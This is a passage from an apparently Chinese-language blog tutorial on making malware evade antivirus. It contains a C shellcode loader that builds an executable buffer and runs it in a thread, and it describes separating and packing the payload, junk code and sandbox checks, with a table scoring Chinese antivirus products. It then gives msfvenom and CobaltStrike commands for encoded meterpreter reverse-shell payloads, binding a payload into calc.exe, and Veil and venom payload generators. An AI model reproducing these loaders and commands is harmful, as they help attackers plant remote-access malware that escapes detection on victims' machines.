(PIMAGE_OPTIONAL_HEADER)&amp;pNt-&gt;OptionalHeader;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(pOt-&gt;DataDirectory[<span class="number">0</span>].VirtualAddress + (DWORD)DllBase);</span><br><span class="line"></span><br><span class="line">	PDWORD pNameAddr = (PDWORD)(pExport-&gt;AddressOfNames + (DWORD)DllBase);</span><br><span class="line">	PWORD pNameOrdAddr = (PWORD)(pExport-&gt;AddressOfNameOrdinals + (DWORD)DllBase);</span><br><span class="line">	PDWORD pFunAddr = (PDWORD)(pExport-&gt;AddressOfFunctions + (DWORD)DllBase);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pExport-&gt;NumberOfNames; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span>* Name = (<span class="keyword">char</span>*)(pNameAddr[i] + (DWORD)DllBase);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(Name, FunName))</span><br><span class="line">		&#123;</span><br><span class="line">			WORD NameOrdinal = pNameOrdAddr[i];</span><br><span class="line">			<span class="keyword">return</span> pFunAddr[NameOrdinal] + (DWORD)DllBase;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*获取指定函数地址*/</span></span><br><span class="line"><span class="function">FARPROC <span class="title">GetApi</span><span class="params">(<span class="keyword">char</span>* LibraryName, <span class="keyword">char</span>* FuncName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PDWORD KernerBase = GerKernelBase();</span><br><span class="line">	M_GetProcAddress MyGetProcess = (M_GetProcAddress)GetFunAddr(KernerBase, <span class="string">&quot;GetProcAddress&quot;</span>);</span><br><span class="line">	M_LoadLibraryA MyLoadLibraryA = (M_LoadLibraryA)GetFunAddr(KernerBase, <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> MyGetProcess(MyLoadLibraryA(LibraryName), FuncName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cr34te_thr34d_dynamic_2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line">    LPVOID lpvAddr = (LPVOID)<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memset</span>(lpvAddr, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(lpvAddr, raw_buf, <span class="keyword">sizeof</span>(raw_buf));</span><br><span class="line">    DWORD pa = <span class="number">0x01</span>;</span><br><span class="line">	LPVOID mVirtualProtect = (LPVOID)GetApi(<span class="string">&quot;kernel32.dll&quot;</span>, <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">    mVirtualProtect(lpvAddr, <span class="keyword">sizeof</span>(raw_buf), PAGE_EXECUTE_READWRITE, &amp;pa);<span class="comment">//PAGE_EXECUTE</span></span><br><span class="line">    <span class="keyword">if</span> (lpvAddr != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        HANDLE s;</span><br><span class="line">        s = CreateThread(<span class="number">0</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpvAddr, raw_buf, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        WaitForSingleObject(s, INFINITE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-3-分离免杀"><a href="#1-3-分离免杀" class="headerlink" title="1.3 分离免杀"></a>1.3 分离免杀</h4><p>截止目前，分离免杀被认为是一种较为先进且免杀效果较好的一种免杀方案。分离免杀是一种思想，将可替换的具有恶意特征的一部分代码从程序中分离出来。这样当杀毒软件单独查杀时就无法检测到文件中的特征了。</p>
<p>其基本结构如下：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    FILE* fp = fopen(&quot;enc.txt&quot;, &quot;rb&quot;);</span><br><span class="line">......</span><br><span class="line">    while ((ch = fgetc(fp)) != EOF)</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">        raw_buf[i] = (unsigned char)ch;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">	d3obfu3c4t0r(raw_buf, i+<span class="number">1</span>);</span><br><span class="line">    cr34te_thr34d_3(raw_buf);</span><br></pre></td></tr></table></figure>



<h4 id="1-4-加壳免杀"><a href="#1-4-加壳免杀" class="headerlink" title="1.4 加壳免杀"></a>1.4 加壳免杀</h4><p>所谓加壳软件，就是重新写PE文件头信息，并将PE文件进行资源压缩和代码加密。加壳后的文件在运行时，先执行加壳软件进行PE文件的还原工作，有的加壳软件先将PE文件全部在内存中还原后，再运行被还原的文件，还有的是还原一部分，运行一部分。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dohxxx/article/details/88786309">https://blog.csdn.net/dohxxx/article/details/88786309</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-206804.htm">https://bbs.pediy.com/thread-206804.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-206873.htm">https://bbs.pediy.com/thread-206873.htm</a></p>
<p>一个相对成熟的免杀程序，加密壳可以说是必须的。它有多方面好处：</p>
<p>1.通用性更广。通用于有无源码免杀。通用于staging与stageless。</p>
<p>2.极大增加了后期分析时的难度。影响后期反制溯源流程。</p>
<p>3.免杀失效后快速产生工具。</p>
<p>4.增加了伸手党窃取成果的难度。</p>
<h4 id="1-5-脏语句"><a href="#1-5-脏语句" class="headerlink" title="1.5 脏语句"></a>1.5 脏语句</h4><p>在不少关键操作前后添加一些无意义的脏语句，从而影响编译后的程序结构，破坏可能存在的静态特征。</p>
<p>诸如：</p>
<p>1.空的IO类函数调用；</p>
<p>2.数值、字符串拷贝；</p>
<p>3.计算、循环</p>
<p>4.内联汇编写花指令</p>
<h3 id="2-反行为检测"><a href="#2-反行为检测" class="headerlink" title="2 反行为检测"></a>2 反行为检测</h3><p>反行为检测在具体实现中使用了不少虚拟容器判断的技术。</p>
<p>最常见的技术思想是，只要发现当前程序处于沙箱中就不运行。除此之外还有一些较为冷门的方案，如程序在某些固定的时间才会执行恶意逻辑。</p>
<p>目前收集到以下技术，常被用于绕过沙箱行为检测：</p>
<table>
<thead>
<tr>
<th>描述</th>
<th>API(C)</th>
</tr>
</thead>
<tbody><tr>
<td>鼠标坐标</td>
<td>GetCursorPos</td>
</tr>
<tr>
<td>开机时长</td>
<td>GetTickCount</td>
</tr>
<tr>
<td>检测内存大小</td>
<td>GlobalMemoryStatusEx</td>
</tr>
<tr>
<td>检测CPU核数</td>
<td>((SYSTEM_INFO)sysinfo).dwNumberOfProcessors</td>
</tr>
<tr>
<td>鼠标点击事件</td>
<td>ReadConsoleInput</td>
</tr>
<tr>
<td>网络连通性</td>
<td>-</td>
</tr>
<tr>
<td>判断文件名</td>
<td>-</td>
</tr>
<tr>
<td>条件时间运行</td>
<td>GetSystemTime &amp;&amp; if</td>
</tr>
<tr>
<td>重启才运行</td>
<td>GetSystemTime &amp;&amp; if</td>
</tr>
</tbody></table>
<h3 id="3-免杀效果"><a href="#3-免杀效果" class="headerlink" title="3 免杀效果"></a>3 免杀效果</h3><table>
<thead>
<tr>
<th>描述</th>
<th>反行为</th>
<th>火绒(静态)</th>
<th>火绒(运行时)</th>
<th>360杀毒(静态)</th>
<th>360杀毒(运行时)</th>
<th>360卫士(静态)</th>
<th>360卫士(运行时)</th>
<th>腾讯管家(静态)</th>
<th>腾讯管家(运行时)</th>
</tr>
</thead>
<tbody><tr>
<td>staging(msf)</td>
<td>GetCursorPos</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>staging(msf)</td>
<td>GetCursorPos</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>分离免杀(msf)</td>
<td>GetCursorPos</td>
<td>×</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>分离免杀(msf)</td>
<td>GetCursorPos</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>staging(cs3.14)</td>
<td>GetCursorPos</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>staging(cs4)</td>
<td>GetCursorPos</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>staging(msf)</td>
<td>GetTickCount</td>
<td>√</td>
<td>√</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
<tr>
<td>staging(msf)</td>
<td>GlobalMemoryStatusEx     GetSystemInfo</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
<td>×</td>
</tr>
</tbody></table>
<h2 id="0x03-部分工具使用方法"><a href="#0x03-部分工具使用方法" class="headerlink" title="0x03 部分工具使用方法"></a>0x03 部分工具使用方法</h2><h3 id="1-Msfvenom"><a href="#1-Msfvenom" class="headerlink" title="1 Msfvenom"></a>1 Msfvenom</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">基本选项：</span><br><span class="line">	-l, --list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</span><br><span class="line">	-a, --arch &lt; architecture&gt; 指定payload的目标架构</span><br><span class="line">	-p, --platform &lt; platform&gt; 指定payload的目标平台</span><br><span class="line">	-s, --space &lt; length&gt; 设定有效攻击荷载的最大长度</span><br><span class="line">	-n, --nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度</span><br><span class="line">	-b, --bad-chars &lt; list&gt; 设定规避字符集，比如: &#x27;\x00&#x27;、‘\xff&#x27;</span><br><span class="line">	-e, --encoder [encoder] 指定需要使用的encoder（编码器）</span><br><span class="line">	-i, --iterations &lt; count&gt; 指定payload的编码次数</span><br><span class="line">	-x, --template &lt; path&gt; 指定一个自定义的可执行文件作为模板</span><br><span class="line">	-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行</span><br><span class="line">	</span><br><span class="line">	-c, --add-code &lt; path&gt; 指定一个附加的win32 shellcode文件</span><br><span class="line">	-h, --help 查看帮助选项</span><br><span class="line">	--help-formats 查看msf支持的输出格式列表</span><br><span class="line">	-f, --format &lt; format&gt; 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</span><br><span class="line">	--payload-options 列举payload的标准选项</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -x &quot;use exploit/multi/handler;\set PAYLOAD windows/meterpreter/reverse_tcp;\set LHOST $&#123;c2_ip&#125;;\set LPORT $c2_port;\exploit&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">裸马生成</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=$&#123;c2_ip&#125; LPORT=$&#123;c2_port&#125; -o shell.exe</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">单次编码</span></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$&#123;c2_ip&#125; LPORT=$&#123;c2_port&#125; -i 3 -e x86/shikata_ga_nai -f exe -o shell.exe</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">多次编码-1</span></span><br><span class="line">msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=$&#123;c2_ip&#125; LPORT=$&#123;c2_port&#125; -e x86/shikata_ga_nai -i 5 |msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw |msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -b &#x27;\x00&#x27; -o payload.exe</span><br><span class="line"><span class="meta">#</span><span class="bash">多次编码-2</span></span><br><span class="line">msfvenom --platform windows -a x86 -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -b &#x27;\x00&#x27; -f exe -o cmd.exe</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">文件捆绑</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x calc.exe -k -f exe -o shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="2-CobaltStrike"><a href="#2-CobaltStrike" class="headerlink" title="2 CobaltStrike"></a>2 CobaltStrike</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">传一份cs到linux</span></span><br><span class="line">chmod +x teamserver;</span><br><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">本地登录到teamserver后，先配置listener:</span></span><br><span class="line"><span class="meta">ColbaltStrike&gt;</span><span class="bash">Listeners&gt;Add ===&gt; cs4有8种listener 及 cs3.x有9种listener</span></span><br><span class="line"><span class="meta">#</span><span class="bash">再生成木马</span></span><br><span class="line"><span class="meta">Attacks&gt;</span><span class="bash">Packages&gt;Windows Execuation=&gt;2种exe2种dll</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#木马生成(CobaltStrike-Attacks)</span><br><span class="line">### 可执行文件</span><br><span class="line">Attacks&gt;Packages&gt;Windows Executable</span><br><span class="line">./teamserver <span class="number">192</span>.<span class="number">168</span>.<span class="number">44</span>.<span class="number">128</span> bloodhound</span><br><span class="line">### HTML程序</span><br><span class="line">Attacks&gt;Packages&gt;HTML Application</span><br><span class="line">### Office宏</span><br><span class="line">Attacks&gt;Packages&gt;Micosoft Office Macro</span><br><span class="line">### Payload Generator</span><br><span class="line">Attacks&gt;Packages&gt;Payload Generator</span><br><span class="line">### 简易恶意网站（常用于无文件攻击），powershell/bitsadmin/regsvr32/python</span><br><span class="line">Attacks&gt;Web Drive-by&gt;Scripted Web Delivery</span><br><span class="line">### 鱼叉式网络Spear Phish</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="3-veil"><a href="#3-veil" class="headerlink" title="3 veil"></a>3 veil</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://get.daocloud.io/docker | sh</span><br><span class="line">nano /etc/docker/daemon.json</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">&#123;</span><br><span class="line"> &quot;registry-mirrors&quot;: [</span><br><span class="line"> &quot;https://1nj0zren.mirror.aliyuncs.com&quot;,</span><br><span class="line"> &quot;https://docker.mirrors.ustc.edu.cn&quot;,</span><br><span class="line"> &quot;http://f1361db2.m.daocloud.io&quot;,</span><br><span class="line"> &quot;https://registry.docker-cn.com&quot;</span><br><span class="line"> ]</span><br><span class="line">&#125;</span><br><span class="line">&lt;&lt;&lt;EOF</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">systemctl restart docker</span><br><span class="line">docker pull mattiasohlsson/veil</span><br><span class="line"></span><br><span class="line">docker run -it -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil</span><br><span class="line">(dk exec -it 4ae72dc914c9 /bin/bash)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>veil内部分为Evasion(躲避载具)、Ordnance（核心payload）两部分。语法非常简单，基本是这样的步骤：</p>
<ul>
<li><p>使用use选定</p>
</li>
<li><p>使用list查看</p>
</li>
<li><p>使用set设置</p>
</li>
<li><p>使用genrate生成</p>
</li>
</ul>
<p>虽然语法简单但veil的灵活性极强，除了支持内置的6种payload外还支持外部导入的shellcode。</p>
<p><strong>3.1 Evasion</strong></p>
<p>虽然看上去有41种躲避载具，但这些载具实质上主要包含两大部分一部分提供meterpreter接口源码一部分提供veil自己内置的shellcode，然后使用c/python/go/lua/perl等多种语言进行加载。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Veil/Evasion&gt;</span><span class="bash">: list</span></span><br><span class="line">        1)      autoit/shellcode_inject/flat.py</span><br><span class="line"></span><br><span class="line">        2)      auxiliary/coldwar_wrapper.py</span><br><span class="line">        3)      auxiliary/macro_converter.py</span><br><span class="line">        4)      auxiliary/pyinstaller_wrapper.py</span><br><span class="line"></span><br><span class="line">        5)      c/meterpreter/rev_http.py</span><br><span class="line">        6)      c/meterpreter/rev_http_service.py</span><br><span class="line">        7)      c/meterpreter/rev_tcp.py</span><br><span class="line">        8)      c/meterpreter/rev_tcp_service.py</span><br><span class="line"></span><br><span class="line">        9)      cs/meterpreter/rev_http.py</span><br><span class="line">        10)     cs/meterpreter/rev_https.py</span><br><span class="line">        11)     cs/meterpreter/rev_tcp.py</span><br><span class="line">        12)     cs/shellcode_inject/base64.py</span><br><span class="line">        13)     cs/shellcode_inject/virtual.py</span><br><span class="line"></span><br><span class="line">        14)     go/meterpreter/rev_http.py</span><br><span class="line">        15)     go/meterpreter/rev_https.py</span><br><span class="line">        16)     go/meterpreter/rev_tcp.py</span><br><span class="line">        17)     go/shellcode_inject/virtual.py</span><br><span class="line"></span><br><span class="line">        18)     lua/shellcode_inject/flat.py</span><br><span class="line"></span><br><span class="line">        19)     perl/shellcode_inject/flat.py</span><br><span class="line"></span><br><span class="line">        20)     powershell/meterpreter/rev_http.py</span><br><span class="line">        21)     powershell/meterpreter/rev_https.py</span><br><span class="line">        22)     powershell/meterpreter/rev_tcp.py</span><br><span class="line">        23)     powershell/shellcode_inject/psexec_virtual.py</span><br><span class="line">        24)     powershell/shellcode_inject/virtual.py</span><br><span class="line"></span><br><span class="line">        25)     python/meterpreter/bind_tcp.py</span><br><span class="line">        26)     python/meterpreter/rev_http.py</span><br><span class="line">        27)     python/meterpreter/rev_https.py</span><br><span class="line">        28)     python/meterpreter/rev_tcp.py</span><br><span class="line">        29)     python/shellcode_inject/aes_encrypt.py</span><br><span class="line">        30)     python/shellcode_inject/arc_encrypt.py</span><br><span class="line">        31)     python/shellcode_inject/base64_substitution.py</span><br><span class="line">        32)     python/shellcode_inject/des_encrypt.py</span><br><span class="line">        33)     python/shellcode_inject/flat.py</span><br><span class="line">        34)     python/shellcode_inject/letter_substitution.py</span><br><span class="line">        35)     python/shellcode_inject/pidinject.py</span><br><span class="line">        36)     python/shellcode_inject/stallion.py</span><br><span class="line"></span><br><span class="line">        37)     ruby/meterpreter/rev_http.py</span><br><span class="line">        38)     ruby/meterpreter/rev_https.py</span><br><span class="line">        39)     ruby/meterpreter/rev_tcp.py</span><br><span class="line">        40)     ruby/shellcode_inject/base64.py</span><br><span class="line">        41)     ruby/shellcode_inject/flat.py</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3.2 Ordnance</strong></p>
<p><strong>3.2.1 payload</strong></p>
<p>veil内置6种原生的payload</p>
<hr>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Veil/Ordnance&gt;</span><span class="bash">: list payloads</span></span><br><span class="line">    1)      bind_tcp          =&gt; Bind TCP Stager (Stage 1)</span><br><span class="line">    2)      rev_http          =&gt; Reverse HTTP Stager (Stage 1)</span><br><span class="line">    3)      rev_https         =&gt; Reverse HTTPS Stager (Stage 1)</span><br><span class="line">    4)      rev_tcp           =&gt; Reverse TCP Stager (Stage 1)</span><br><span class="line">    5)      rev_tcp_all_ports =&gt; Reverse TCP All Ports Stager (Stage 1)</span><br><span class="line">    6)      rev_tcp_dns       =&gt; Reverse TCP DNS Stager (Stage 1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>3.2.2 encoder</strong></p>
<p>veil使用xor编码器对shellcode进行转换</p>
<h3 id="4-venom"><a href="#4-venom" class="headerlink" title="4 venom"></a>4 venom</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">安装</span></span><br><span class="line">git clone https://github.com/r00t-3xp10it/venom.git</span><br><span class="line">cd venom/aux &amp;&amp; ./setup.sh; cd ..</span><br><span class="line">./venom.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">[➽] Chose Categorie number:2 - Windows-OS payloads</span><br><span class="line">AGENT Nº1:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : C (uuid obfuscation)</span><br><span class="line">    AGENT EXTENSION    : DLL|CPL</span><br><span class="line">    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)</span><br><span class="line">    DETECTION RATIO    : http://goo.gl/NkVLzj</span><br><span class="line"></span><br><span class="line">    AGENT Nº2:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : DLL</span><br><span class="line">    AGENT EXTENSION    : DLL|CPL</span><br><span class="line">    AGENT EXECUTION    : rundll32.exe agent.dll,main | press to exec (cpl)</span><br><span class="line">    DETECTION RATIO    : http://goo.gl/dBGd4x</span><br><span class="line"></span><br><span class="line">    AGENT Nº3:</span><br><span class="line">    ──────────</span><br><span class="line">    TARGET SYSTEMS     : Windows</span><br><span class="line">    SHELLCODE FORMAT   : C</span><br><span class="line">    AGENT EXTENSION    : PY(pyherion|NXcrypt)|EXE</span><br><span class="line">    AGENT EXECUTION    : python agent.py | press to exec (exe)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/7rSEyA (.py)</span><br><span class="line">    DETECTION RATIO    : https://goo.gl/WJ9HbD 